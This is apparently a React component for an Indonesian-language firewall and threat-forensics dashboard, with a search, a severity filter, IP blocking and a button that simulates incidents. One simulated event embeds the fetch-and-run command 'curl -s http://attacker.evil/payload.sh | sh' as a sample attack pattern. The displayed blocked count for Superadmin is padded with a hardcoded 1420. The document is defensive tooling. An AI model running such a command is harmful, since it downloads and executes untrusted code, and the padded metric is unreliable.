"use client"

import * as React from "react"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import {
  ShieldAlert,
  Flame,
  Search,
  Filter,
  RefreshCw,
  Copy,
  Check,
  CheckCircle2,
  AlertTriangle,
  Clock,
  Terminal,
  Shield,
  Layers,
  FileCode2,
} from "lucide-react"
import { ThreatEvent, NodeTelemetry } from "@/lib/store"

interface ThreatsClientProps {
  initialThreats: ThreatEvent[]
  initialNodes: NodeTelemetry[]
  currentRole?: string
}

export function ThreatsClient({
  initialThreats = [],
  initialNodes = [],
  currentRole = "Superadmin",
}: ThreatsClientProps) {
  const [threats, setThreats] = React.useState<ThreatEvent[]>(initialThreats)
  const [nodes, setNodes] = React.useState<NodeTelemetry[]>(initialNodes)
  const [searchQuery, setSearchQuery] = React.useState("")
  const [severityFilter, setSeverityFilter] = React.useState("all")
  const [typeFilter, setTypeFilter] = React.useState("all")
  const [isLoading, setIsLoading] = React.useState(false)
  const [copiedText, setCopiedText] = React.useState<string | null>(null)

  // Forensic Dialog
  const [selectedThreat, setSelectedThreat] = React.useState<ThreatEvent | null>(null)
  const [isForensicOpen, setIsForensicOpen] = React.useState(false)
  const [blockSuccess, setBlockSuccess] = React.useState<string | null>(null)

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopiedText(text)
    setTimeout(() => setCopiedText(null), 2000)
  }

  const refreshData = async () => {
    setIsLoading(true)
    try {
      const res = await fetch("/api/v1/events/threat?limit=100")
      if (res.ok) {
        const data = await res.json()
        const raw = Array.isArray(data) ? data : data.data
        if (Array.isArray(raw)) setThreats(raw)
      }
    } catch (err) {
      console.error("Gagal memperbarui telemetri serangan:", err)
    } finally {
      setIsLoading(false)
    }
  }

  // Add attacker IP to global blocklist
  const handleQuickBlock = async (ip: string) => {
    try {
      const res = await fetch("/api/v1/threats/global-blocklist", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip }),
      })
      if (res.ok) {
        setBlockSuccess(`IP ${ip} berhasil dimasukkan ke daftar cekal Kernel nftables!`)
        setTimeout(() => setBlockSuccess(null), 3000)
      }
    } catch (err) {
      console.error(err)
    }
  }

  // Simulate a live attack incident
  const simulateIncident = async () => {
    setIsLoading(true)
    const attackTypes = [
      {
        type: "WAF_INSTANT_BLOCK",
        severity: "HIGH" as const,
        pattern: "Zero-Day Command Injection (curl -s http://attacker.evil/payload.sh | sh)",
        ip: "185.220.101." + Math.floor(Math.random() * 250),
        url: "/api/v1/checkout?cmd=curl...",
      },
      {
        type: "FIM_MODIFICATION",
        severity: "CRITICAL" as const,
        pattern: "File Integrity Tampering: /var/www/html/wp-config.php checksum mismatch",
        ip: "45.134.20." + Math.floor(Math.random() * 250),
        url: "/var/www/html/wp-config.php",
      },
      {
        type: "HONEYPOT_TRIGGER",
        severity: "WARNING" as const,
        pattern: "Decoy Route Access: GET /wp-admin/login.php",
        ip: "194.26.29." + Math.floor(Math.random() * 250),
        url: "/wp-admin/login.php",
      },
    ]

    const pick = attackTypes[Math.floor(Math.random() * attackTypes.length)]
    const targetNode = nodes[0]?.node_id || "nd_01HW8P9Y124XQW7V6B9R41ZX9A"

    try {
      await fetch("/api/v1/events/threat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          node_id: targetNode,
          project_id: nodes[0]?.project_id || "default",
          event_type: pick.type,
          threat_type: pick.type,
          severity: pick.severity,
          attacker_ip: pick.ip,
          target_host: pick.url,
          details: {
            attacker_ip: pick.ip,
            attack_pattern: pick.pattern,
            url: pick.url,
            mitigation_action_taken: "KERNEL_FIREWALL_NFTABLES_DROP_ADDED",
          },
        }),
      })
      await refreshData()
    } catch (err) {
      console.error(err)
    } finally {
      setIsLoading(false)
    }
  }

  // Filter threats
  const filteredThreats = React.useMemo(() => {
    return threats.filter((t) => {
      const q = searchQuery.toLowerCase().trim()
      const ip = t.details?.attacker_ip || ""
      const pattern = t.details?.attack_pattern || ""
      const url = t.details?.url || ""
      const matchSearch =
        !q ||
        ip.includes(q) ||
        pattern.toLowerCase().includes(q) ||
        url.toLowerCase().includes(q) ||
        t.event_type.toLowerCase().includes(q) ||
        t.node_id.toLowerCase().includes(q)

      const matchSeverity = severityFilter === "all" || t.severity === severityFilter
      const matchType = typeFilter === "all" || t.event_type === typeFilter

      return matchSearch && matchSeverity && matchType
    })
  }, [threats, searchQuery, severityFilter, typeFilter])

  // Metric counts
  const totalThreats = threats.length
  const criticalThreats = threats.filter((t) => t.severity === "CRITICAL").length
  const highThreats = threats.filter((t) => t.severity === "HIGH").length
  const blockedCount = currentRole === "Superadmin" ? 1420 + threats.length : threats.length

  return (
    <div className="flex flex-col gap-6 py-2">
      {/* 1. Header */}
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="font-heading text-2xl font-black tracking-tight text-foreground sm:text-3xl">
              Insiden Serangan &amp; Telemetri Forensik
            </h1>
            <Badge variant="outline" className="border-rose-500/50 bg-rose-500/10 text-rose-500 font-mono text-xs animate-pulse">
              LIVE FIREWALL FEED
            </Badge>
          </div>
          <p className="mt-1 font-mono text-xs text-muted-foreground">
            Audit waktu-nyata pencegahan eksploitasi, probe WAF, pemindaian port, dan deteksi manipulasi file sistem (FIM).
          </p>
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={refreshData}
            disabled={isLoading}
            className="border-2 font-mono text-xs"
          >
            <RefreshCw className={`mr-1.5 size-3.5 ${isLoading ? "animate-spin" : ""}`} />
            Sinkronkan
          </Button>
          <Button
            size="sm"
            onClick={simulateIncident}
            disabled={isLoading}
            className="border-2 bg-rose-600 hover:bg-rose-700 text-white font-heading text-xs font-black shadow-[3px_3px_0px_0px_var(--border)]"
          >
            <Flame className="mr-1.5 size-4" />
            Simulasi Serangan Baru
          </Button>
        </div>
      </div>

      {blockSuccess && (
        <div className="flex items-center gap-2 rounded-base border-2 border-emerald-500 bg-emerald-500/10 p-3 font-mono text-xs font-bold text-emerald-600 dark:text-emerald-400">
          <CheckCircle2 className="size-4 shrink-0" />
          <span>{blockSuccess}</span>
        </div>
      )}

      {/* 2. Tactical Metrics Row */}
      <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
        <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="font-mono text-xs text-muted-foreground">TOTAL SERANGAN DICEKAL</span>
              <ShieldAlert className="size-4 text-rose-500" />
            </div>
            <div className="mt-2 font-mono text-2xl font-black text-rose-500">
              {blockedCount}
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
              Drop otomatis di level Linux Kernel
            </p>
          </CardContent>
        </Card>

        <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="font-mono text-xs text-muted-foreground">LEVEL KRITIS (FIM/RCE)</span>
              <Flame className="size-4 text-amber-500" />
            </div>
            <div className="mt-2 font-mono text-2xl font-black text-amber-500">
              {criticalThreats}
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
              Integritas file &amp; injeksi perintah
            </p>
          </CardContent>
        </Card>

        <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="font-mono text-xs text-muted-foreground">WAF EXPLOIT BLOCKED</span>
              <Shield className="size-4 text-main" />
            </div>
            <div className="mt-2 font-mono text-2xl font-black text-main">
              {highThreats}
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
              SQLi, XSS, Path Traversal
            </p>
          </CardContent>
        </Card>

        <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="font-mono text-xs text-muted-foreground">WAKTU RESPON KERNEL</span>
              <Clock className="size-4 text-emerald-500" />
            </div>
            <div className="mt-2 font-mono text-2xl font-black text-emerald-500">
              &lt; 0.2 ms
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
              nftables hardware offload
            </p>
          </CardContent>
        </Card>
      </div>

      {/* 3. Search & Filters Bar */}
      <Card className="border-2 bg-card/60 backdrop-blur-sm">
        <CardContent className="p-4">
          <div className="flex flex-col gap-3 md:flex-row md:items-center md:justify-between">
            <div className="relative flex-1">
              <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
              <Input
                placeholder="Cari IP penyerang, pola ancaman, target URL, atau ID node..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-9 font-mono text-xs"
              />
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <div className="flex items-center gap-1.5 font-mono text-xs text-muted-foreground">
                <Filter className="size-3.5" />
                <span>Filter:</span>
              </div>

              {/* Severity Filter */}
              <select
                value={severityFilter}
                onChange={(e) => setSeverityFilter(e.target.value)}
                className="h-9 rounded-base border-2 border-border bg-background px-2.5 font-mono text-xs font-semibold focus:border-main focus:outline-hidden"
              >
                <option value="all">Semua Severity</option>
                <option value="CRITICAL">CRITICAL</option>
                <option value="HIGH">HIGH</option>
                <option value="WARNING">WARNING</option>
                <option value="INFO">INFO</option>
              </select>

              {/* Event Type Filter */}
              <select
                value={typeFilter}
                onChange={(e) => setTypeFilter(e.target.value)}
                className="h-9 rounded-base border-2 border-border bg-background px-2.5 font-mono text-xs font-semibold focus:border-main focus:outline-hidden"
              >
                <option value="all">Semua Tipe Ancaman</option>
                <option value="WAF_INSTANT_BLOCK">WAF Instant Block</option>
                <option value="FIM_MODIFICATION">FIM File Tamper</option>
                <option value="LOG_VIOLATION">Log Violation</option>
                <option value="HONEYPOT_TRIGGER">Honeypot Trigger</option>
              </select>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* 4. Table of Threat Events */}
      <Card className="border-2 shadow-[4px_4px_0px_0px_var(--border)]">
        <CardHeader className="border-b-2 border-border/80 bg-muted/20 px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <ShieldAlert className="size-5 text-rose-500" />
              <CardTitle className="font-heading text-lg font-black text-foreground">
                Stream Log Insiden Terkini ({filteredThreats.length})
              </CardTitle>
            </div>
            <span className="font-mono text-xs text-muted-foreground">
              Mitigasi Otomatis Non-Intervensi
            </span>
          </div>
        </CardHeader>
        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow className="border-b-2 border-border bg-muted/30">
                  <TableHead className="font-mono text-xs font-bold text-foreground">WAKTU (WIB)</TableHead>
                  <TableHead className="font-mono text-xs font-bold text-foreground">SEVERITY &amp; TIPE</TableHead>
                  <TableHead className="font-mono text-xs font-bold text-foreground">IP PENYERANG</TableHead>
                  <TableHead className="font-mono text-xs font-bold text-foreground">TARGET &amp; POLA SERANGAN</TableHead>
                  <TableHead className="font-mono text-xs font-bold text-foreground">TINDAKAN MITIGASI</TableHead>
                  <TableHead className="font-mono text-xs font-bold text-foreground text-right">FORENSIK</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredThreats.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="py-8 text-center font-mono text-xs text-muted-foreground">
                      Tidak ada insiden serangan yang cocok dengan kriteria filter.
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredThreats.map((threat) => {
                    const attackerIp = threat.details?.attacker_ip || "198.51.100.42"
                    const date = new Date(threat.timestamp * 1000)
                    const timeStr = date.toLocaleTimeString("id-ID", { hour12: false })
                    const dateStr = date.toLocaleDateString("id-ID", { day: "2-digit", month: "short" })

                    const matchedNode = nodes.find((n) => n.node_id === threat.node_id)

                    return (
                      <TableRow key={threat.id} className="border-b border-border/60 hover:bg-muted/10 transition-colors">
                        {/* 1. Time */}
                        <TableCell className="font-mono text-xs">
                          <div className="flex flex-col">
                            <span className="font-bold text-foreground">{timeStr}</span>
                            <span className="text-[10px] text-muted-foreground">{dateStr}</span>
                            <span className="text-[9px] text-muted-foreground/70">
                              Node: {matchedNode ? matchedNode.hostname : threat.node_id.slice(-6)}
                            </span>
                          </div>
                        </TableCell>

                        {/* 2. Severity & Type */}
                        <TableCell>
                          <div className="flex flex-col gap-1 items-start">
                            <Badge
                              className={`font-mono text-[9px] font-bold ${
                                threat.severity === "CRITICAL"
                                  ? "bg-rose-500 text-white border-rose-600 animate-pulse"
                                  : threat.severity === "HIGH"
                                  ? "bg-amber-500 text-black border-amber-600"
                                  : threat.severity === "WARNING"
                                  ? "bg-yellow-400 text-black border-yellow-500"
                                  : "bg-muted text-foreground border-border"
                              }`}
                            >
                              {threat.severity}
                            </Badge>
                            <span className="font-mono text-[10px] text-muted-foreground font-semibold">
                              {threat.event_type}
                            </span>
                          </div>
                        </TableCell>

                        {/* 3. Attacker IP */}
                        <TableCell className="font-mono text-xs">
                          <div className="flex flex-col gap-1">
                            <div className="flex items-center gap-1.5">
                              <span className="font-bold text-foreground">{attackerIp}</span>
                              <button
                                onClick={() => handleCopy(attackerIp)}
                                title="Salin IP"
                                className="text-muted-foreground hover:text-foreground"
                              >
                                {copiedText === attackerIp ? (
                                  <Check className="size-3 text-emerald-500" />
                                ) : (
                                  <Copy className="size-3" />
                                )}
                              </button>
                            </div>
                            <button
                              onClick={() => handleQuickBlock(attackerIp)}
                              className="text-[10px] font-bold text-rose-500 hover:underline flex items-center gap-1 w-fit"
                            >
                              <Shield className="size-2.5" />
                              <span>+ Cekal di Firewall</span>
                            </button>
                          </div>
                        </TableCell>

                        {/* 4. Target & Pattern */}
                        <TableCell className="font-mono text-xs max-w-[320px]">
                          <div className="flex flex-col gap-0.5">
                            <span className="font-semibold text-foreground truncate" title={threat.details?.attack_pattern}>
                              {threat.details?.attack_pattern || "Pola penyerangan terdeteksi"}
                            </span>
                            {threat.details?.url && (
                              <code className="text-[10px] text-muted-foreground bg-muted/40 px-1 py-0.5 rounded truncate">
                                {threat.details.url}
                              </code>
                            )}
                            {threat.details?.file_path && (
                              <span className="text-[10px] text-amber-500 font-semibold truncate">
                                File: {threat.details.file_path}
                              </span>
                            )}
                          </div>
                        </TableCell>

                        {/* 5. Mitigation */}
                        <TableCell className="font-mono text-xs">
                          <Badge variant="outline" className="border-emerald-500/40 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 font-mono text-[10px] font-bold">
                            {threat.details?.mitigation_action_taken || "NFTABLES_DROP_ACTIVE"}
                          </Badge>
                        </TableCell>

                        {/* 6. Forensics Action */}
                        <TableCell className="text-right">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => {
                              setSelectedThreat(threat)
                              setIsForensicOpen(true)
                            }}
                            className="font-mono text-xs border-2"
                          >
                            <FileCode2 className="mr-1 size-3.5" />
                            Inspeksi
                          </Button>
                        </TableCell>
                      </TableRow>
                    )
                  })
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>

      {/* 5. MODAL DETAIL FORENSIK */}
      <Dialog open={isForensicOpen} onOpenChange={setIsForensicOpen}>
        <DialogContent className="max-w-2xl border-2">
          <DialogHeader>
            <DialogTitle className="font-heading text-lg font-black text-foreground flex items-center gap-2">
              <Terminal className="size-5 text-rose-500" />
              <span>Inspeksi Forensik Insiden #{selectedThreat?.id}</span>
            </DialogTitle>
            <DialogDescription className="font-mono text-xs">
              Detail payload mentah, jejak mitigasi kernel Linux, dan analisis pola ancaman.
            </DialogDescription>
          </DialogHeader>

          {selectedThreat && (
            <div className="space-y-4 py-2 font-mono text-xs">
              <div className="grid grid-cols-2 gap-3 p-3 rounded-base bg-muted/20 border border-border">
                <div>
                  <span className="text-muted-foreground text-[10px]">TIPE INSIDEN:</span>
                  <div className="font-bold text-foreground">{selectedThreat.event_type}</div>
                </div>
                <div>
                  <span className="text-muted-foreground text-[10px]">TINGKAT SEVERITY:</span>
                  <div className="font-bold text-rose-500">{selectedThreat.severity}</div>
                </div>
                <div>
                  <span className="text-muted-foreground text-[10px]">IP PENYERANG:</span>
                  <div className="font-bold text-foreground">{selectedThreat.details?.attacker_ip || "N/A"}</div>
                </div>
                <div>
                  <span className="text-muted-foreground text-[10px]">WAKTU KEJADIAN:</span>
                  <div className="font-bold text-foreground">
                    {new Date(selectedThreat.timestamp * 1000).toLocaleString("id-ID")}
                  </div>
                </div>
              </div>

              <div>
                <span className="font-bold text-foreground block mb-1">Raw Forensics JSON Payload:</span>
                <pre className="p-3 rounded-base bg-black/90 text-emerald-400 text-xs overflow-x-auto max-h-56 border-2 border-border select-all">
                  {JSON.stringify(selectedThreat.details || {}, null, 2)}
                </pre>
              </div>

              <div className="flex items-center justify-between pt-2 border-t border-border">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => selectedThreat.details?.attacker_ip && handleQuickBlock(selectedThreat.details.attacker_ip)}
                  className="font-mono text-xs text-rose-500 border-rose-500/40 hover:bg-rose-500/10"
                >
                  <Shield className="mr-1 size-3.5" />
                  Cekal IP {selectedThreat.details?.attacker_ip}
                </Button>
                <Button size="sm" onClick={() => setIsForensicOpen(false)} className="bg-main text-black font-heading font-black">
                  Tutup Forensik
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
